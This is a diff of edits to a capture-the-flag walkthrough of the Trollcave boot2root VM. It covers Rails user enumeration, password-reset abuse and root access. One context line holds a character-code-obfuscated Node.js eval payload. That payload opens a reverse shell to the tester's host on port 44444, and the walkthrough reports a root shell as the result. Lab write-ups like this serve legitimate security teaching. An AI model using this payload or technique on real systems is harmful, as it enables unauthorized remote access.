@@ -23,7 +23,7 @@ This post documents the complete walkthrough of Trollcave: 1.2, a boot2root [VM]
 Your first goal is to abuse the services on the machine to gain unauthorized shell access. Your ultimate goal is to read a text file in the `root` user's home directory (`/root/flag.txt`).
 
 ### Information Gathering
-Let's kick this off with a `nmap` scan to establish the services available in the host.
+I always start with a `nmap` scan to establish the services available in the host.
 
 ```
 # nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.30.128
@@ -84,11 +84,11 @@ ID	Response   Lines      Word         Chars          Payload
 018906:  C=302      0 L	       5 W	     93 Ch	  "users"
 ```
 
-All the HTTP response code `302` redirects to `/login`. Boring.
+All those with HTTP response code `302` redirects to `/login`. The rest of the HTTP response code 200 redirects to their respective error pages, e.g. `/404` redirects to `404.html`.
 
 ### Ruby on Rails
 
-I notice [REST](https://en.wikipedia.org/wiki/Representational_state_transfer)ful URLs during cursory browsing of the site, and I believe it's a RoR web application.
+I notice [REST](https://en.wikipedia.org/wiki/Representational_state_transfer)ful URLs during my cursory browsing of the site, and I believe it's a RoR web application.
 
 ```
 # curl -s http://192.168.30.128/ | grep -Po '(href|src)=".{2,}"' | cut -d'"' -f2 | sort | uniq
@@ -116,13 +116,15 @@ I notice [REST](https://en.wikipedia.org/wiki/Representational_state_transfer)fu
 /users/5
 ```
 
-The cat is out of the bag when I read the blog post at `/blogs/6`. The site is a RoR web application. At least now we know what we are dealing with.
+I read the blog post at `/blogs/6 and it says something about "a resource in rails", I believe it's saying the site is a RoR web application. OK, and check out the ruby avatar too; at least now we know what we are dealing with.
+
+_Image shows that the site is a RoR web application._
 
 ![screenshot-2](/assets/images/posts/trollcave-walkthrough/screenshot-2.png)
 
 ### Enumerating Users
 
-I'm able to determine the users of the site using nothing more than `curl` and a command-line JSON parser `jq`.
+A RoR web application will, by default, produce JSON output, by appending a `.json`. Knowing this will help in enumeration. Here, I'm able to determine the users of the site using nothing more than `curl` and a command-line JSON parser `jq`.
 
 ```
 # curl -s 192.168.30.128/users/{1..20}.json | jq -raM
@@ -188,7 +190,7 @@ Using the same technique against `/reports`, I'm also able to get four password 
 ...
 ```
 
-Too bad the `bcrypt` hashes have salt and a computational cost of 10 rounds; cracking them is a futile exercise and a waste of CPU cycles. We need a better way.
+The password digests or `bcrypt` hashes have salt and a computational cost of 10 rounds; cracking them is a futile exercise and a waste of CPU cycles. We need a better way.
 
 ### Password Reset
 
@@ -200,7 +202,7 @@ I'm able to navigate to the password reset page by going to `/password_resets/ne
 
 ![screenshot-4](/assets/images/posts/trollcave-walkthrough/screenshot-4.png)
 
-The initial attempt to reset King's password (**Superadmin**) fails because password reset is for normal members. Well, let's reset the password of an ordinary member and see what happens.
+The initial attempt to reset King's password (**Superadmin**) fails because the site has configured password reset for normal members. Well, let's reset the password of an ordinary member and see what happens.
 
 According to the blog post, the mailer has an issue resulting in the password reset URL presenting itself like so.
 
@@ -240,7 +242,7 @@ After the upload, I can view the file information by going to `/user_files/[file
 
 Now that we know the file's absolute path, we can start to think about exploitation. At the upload page, we see that we can provide an alternative file name. Is this our ticket in?
 
-When I gain access to **Superadmin** , I unlock more blog posts and there is a particular blog post and comment that may potentially be the key information to gaining access.
+When I gain access to **Superadmin**, I unlock more blog posts and there's a particular blog post and comment that may potentially be the key information to gaining access.
 
 _Image shows user `rails` is present — SSH is possible?_
 
@@ -296,7 +298,7 @@ Awesome.
 
 ### Node.js
 
-I notice a service running at `tcp/8888` during enumeration.
+I notice an unknown service running at `tcp/8888` during enumeration of `rails` account.
 
 ![screenshot-18](/assets/images/posts/trollcave-walkthrough/screenshot-18.png)
 
@@ -304,7 +306,7 @@ It turns out to be Node.js running some sort of calculator application for King.
 
 ![screenshot-20](/assets/images/posts/trollcave-walkthrough/screenshot-20.png)
 
-If I've to guess, I say this is the way to gain `root` privileges because King is on the `sudoers` list.
+If I've to guess, I say this is the way to gain `root` privileges since King is on the `sudoers` list.
 
 ![screenshot-19](/assets/images/posts/trollcave-walkthrough/screenshot-19.png)
 
@@ -352,7 +354,7 @@ The final exploit URL looks like this.
 http://localhost:9999/calc?sum=eval(String.fromCharCode(32,40,102,117,110,99,116,105,111,110,40,41,123,32,118,97,114,32,114,101,113,117,105,114,101,32,61,32,103,108,111,98,97,108,46,114,101,113,117,105,114,101,32,124,124,32,103,108,111,98,97,108,46,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,99,111,110,115,116,114,117,99,116,111,114,46,95,108,111,97,100,59,32,105,102,32,40,33,114,101,113,117,105,114,101,41,32,114,101,116,117,114,110,59,32,118,97,114,32,99,109,100,32,61,32,40,103,108,111,98,97,108,46,112,114,111,99,101,115,115,46,112,108,97,116,102,111,114,109,46,109,97,116,99,104,40,47,94,119,105,110,47,105,41,41,32,63,32,34,99,109,100,34,32,58,32,34,47,98,105,110,47,115,104,34,59,32,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,34,110,101,116,34,41,44,32,99,112,32,61,32,114,101,113,117,105,114,101,40,34,99,104,105,108,100,95,112,114,111,99,101,115,115,34,41,44,32,117,116,105,108,32,61,32,114,101,113,117,105,114,101,40,34,117,116,105,108,34,41,44,32,115,104,32,61,32,99,112,46,115,112,97,119,110,40,99,109,100,44,32,91,93,41,59,32,118,97,114,32,99,108,105,101,110,116,32,61,32,116,104,105,115,59,32,118,97,114,32,99,111,117,110,116,101,114,61,48,59,32,102,117,110,99,116,105,111,110,32,83,116,97,103,101,114,82,101,112,101,97,116,40,41,123,32,99,108,105,101,110,116,46,115,111,99,107,101,116,32,61,32,110,101,116,46,99,111,110,110,101,99,116,40,52,52,52,52,52,44,32,34,49,57,50,46,49,54,56,46,51,48,46,49,50,56,34,44,32,102,117,110,99,116,105,111,110,40,41,32,123,32,99,108,105,101,110,116,46,115,111,99,107,101,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,32,105,102,32,40,116,121,112,101,111,102,32,117,116,105,108,46,112,117,109,112,32,61,61,61,32,34,117,110,100,101,102,105,110,101,100,34,41,32,123,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,46,115,111,99,107,101,116,41,59,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,46,115,111,99,107,101,116,41,59,32,125,32,101,108,115,101,32,123,32,117,116,105,108,46,112,117,109,112,40,115,104,46,115,116,100,111,117,116,44,32,99,108,105,101,110,116,46,115,111,99,107,101,116,41,59,32,117,116,105,108,46,112,117,109,112,40,115,104,46,115,116,100,101,114,114,44,32,99,108,105,101,110,116,46,115,111,99,107,101,116,41,59,32,125,32,125,41,59,32,115,111,99,107,101,116,46,111,110,40,34,101,114,114,111,114,34,44,32,102,117,110,99,116,105,111,110,40,101,114,114,111,114,41,32,123,32,99,111,117,110,116,101,114,43,43,59,32,105,102,40,99,111,117,110,116,101,114,60,61,32,49,48,41,123,32,115,101,116,84,105,109,101,111,117,116,40,102,117,110,99,116,105,111,110,40,41,32,123,32,83,116,97,103,101,114,82,101,112,101,97,116,40,41,59,125,44,32,53,42,49,48,48,48,41,59,32,125,32,101,108,115,101,32,112,114,111,99,101,115,115,46,101,120,105,116,40,41,59,32,125,41,59,32,125,32,83,116,97,103,101,114,82,101,112,101,97,116,40,41,59,32,125,41,40,41,59,49,43,49,59,10))`
 ```
 
-On my `netcat` listener, a shell returns and I'm able to `sudo` as `root`.
+On my `netcat` listener, a shell returns and I can `sudo` as `root`.
 
 ![screenshot-23](/assets/images/posts/trollcave-walkthrough/screenshot-23.png)
 
@@ -360,7 +362,7 @@ On my `netcat` listener, a shell returns and I'm able to `sudo` as `root`.
 
 ### Afterthought
 
-This was the perfect opportunity to explore [Ruby on Rails](https://en.wikipedia.org/wiki/Ruby_on_Rails) and [Node.js](https://en.wikipedia.org/wiki/Node.js). I've heard positive reviews from the **webdev** community (not that I'm using them professionally) but never got the chance to go deeper until now.
+This was the perfect opportunity to explore [Ruby on Rails](https://en.wikipedia.org/wiki/Ruby_on_Rails) and [Node.js](https://en.wikipedia.org/wiki/Node.js). I've heard positive reviews from the **webdev** community but never got the chance to go deeper until now; not that I'm using them professionally though.
 
 I rate this VM highly educational and fun.
 
